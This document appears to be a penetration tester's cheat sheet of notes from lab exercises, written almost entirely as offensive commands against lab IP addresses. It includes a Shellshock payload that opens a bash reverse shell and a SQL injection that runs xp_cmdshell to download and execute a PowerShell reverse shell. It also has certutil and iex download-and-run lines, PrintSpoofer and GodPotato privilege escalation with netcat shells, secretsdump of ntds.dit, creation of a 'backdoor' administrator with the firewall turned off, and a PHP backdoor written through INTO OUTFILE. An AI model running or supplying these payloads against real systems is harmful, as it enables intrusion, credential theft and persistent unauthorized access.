Dump Secrets Such as SYSTEM and ntds.dit:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM -sam SAM LOCAL
```

Shellshock:

```bash
nikto -ask=no -h http://10.11.1.71:80 2>&1
OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the 'shellshock' vulnerability

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.119.183/9001 0>&1'" \
http://10.11.1.71:80/cgi-bin/admin.cgi
```

Local port forward:

```bash
ssh -i id_ecdsa userE@192.168.138.246 -p 2222 -L 8000:localhost:8000 -N
# On the box running on port 80, want it to be on my machine
ssh -f -N -L 127.0.0.1:8080:127.0.0.1:80 ariah@192.168.239.99
```

Elevate privileges of a user you have access to with a single command:

```bash
Add-LocalGroupMember -Group Administrators -Member ariah
```

```bash
admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+

iex(iwr -uri 192.168.45.187:8000/transfer_files.ps1 -usebasicparsing)

iex(iwr -uri 192.168.49.129:8000/transfer_files.ps1 -usebasicparsing)

iex(iwr -uri 10.10.112.153:1234/transfer_files_ad.ps1 -usebasicparsing)
certutil.exe -f -urlcache -split http://192.168.49.129:8000/nc.exe nc.exe

certutil.exe -f -urlcache -split http://192.168.45.187:8000/

# Uploaded nc.exe from /usr/share/windows-resources/binaries/nc.exe
.\PrintSpoofer64.exe -c ".\nc.exe -e cmd.exe 192.168.45.163 6969"

.\PrintSpoofer64.exe -i -c C:\Windows\Tasks\binary.exe

.\GodPotato-NET2.exe -cmd ".\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.163 6969"

Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:dev04.medtech.com"

# Create Another Admin for RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
netsh advfirewall set allprofiles state off
net user /add backdoor Password123
net localgroup administrators /add backdoor
net localgroup "Remote Desktop Users" backdoor /add
xfreerdp /v:192.168.152.153 /u:backdoor /p:Password123 /cert:ignore +clipboard

curl http://192.168.45.163:8000/linpeas.sh -o linpeas.sh;chmod +x linpeas.sh;
curl http://192.168.45.163:8000/pspy64 -o pspy64;chmod +x pspy64;./pspy64
```

===Nmap====
nmap -p- -sT -sV -A $IP
nmap -p- -sC -sV $ip --open
nmap -p- --script=vuln $IP
###HTTP-Methods
nmap --script http-methods --script-args http-methods.url-path='/website' 
###  --script smb-enum-shares
sed IPs:
grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' FILE

================================================================================
===WPScan & SSL
wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u

===WPScan Brute Forceing:
wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt

===Aggressive Plugin Detection:
wpscan --url $URL --enumerate p --plugins-detection aggressive
================================================================================
===Nikto with SSL and Evasion
nikto --host $ip -ssl -evasion 1
SEE EVASION MODALITIES.
================================================================================
===dns_recon
dnsrecon –d yourdomain.com
================================================================================
===gobuster directory
gobuster dir -u http://$ip/ -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -k -t 30

===gobuster files
gobuster dir -u http://$ip/ -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -k -t 30 -x txt,pdf,config

===gobuster for SubDomain brute forcing:
gobuster dns -d domain.org -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
"just make sure any DNS name you find resolves to an in-scope address before you test it"
================================================================================
===Extract IPs from a text file.
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt
================================================================================
===Wfuzz XSS Fuzzing============================================================
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-BruteLogic.txt "$URL"
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt "$URL"

===COMMAND INJECTION WITH POST DATA
wfuzz -c -z file,/opt/SecLists/Fuzzing/command-injection-commix.txt -d "doi=FUZZ" "$URL"

===Test for Paramter Existence!
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt "$URL"

===AUTHENTICATED FUZZING DIRECTORIES:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d "SESSIONID=value" "$URL"

===AUTHENTICATED FILE FUZZING:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -d "SESSIONID=value" "$URL"

===FUZZ Directories:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"

wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_directories.txt --hc 404 "$URL"

===FUZZ FILES:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
|
LARGE WORDS:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-words.txt --hc 404 "$URL"
|
USERS:
wfuzz -c -z file,/opt/SecLists/Usernames/top-usernames-shortlist.txt --hc 404,403 "$URL"


================================================================================
===Command Injection with commix, ssl, waf, random agent.
commix --url="https://supermegaleetultradomain.com?parameter=" --level=3 --force-ssl --skip-waf --random-agent
================================================================================
===SQLMap
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
/SecLists/Fuzzing/alphanum-case.txt
================================================================================
===Social Recon
theharvester -d domain.org -l 500 -b google
================================================================================
===Nmap HTTP-methods
nmap -p80,443 --script=http-methods  --script-args http-methods.url-path='/directory/goes/here'
================================================================================
===SMTP USER ENUM
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
================================================================================

===Command Execution Verification - [Ping check]
tcpdump -i any -c5 icmp
====
#Check Network
netdiscover /r 0.0.0.0/24
====
#INTO OUTFILE D00R
SELECT “” into outfile “/var/www/WEROOT/backdoor.php”;
====
LFI?
#PHP Filter Checks.
php://filter/convert.base64-encode/resource=
====
UPLOAD IMAGE?
GIF89a1
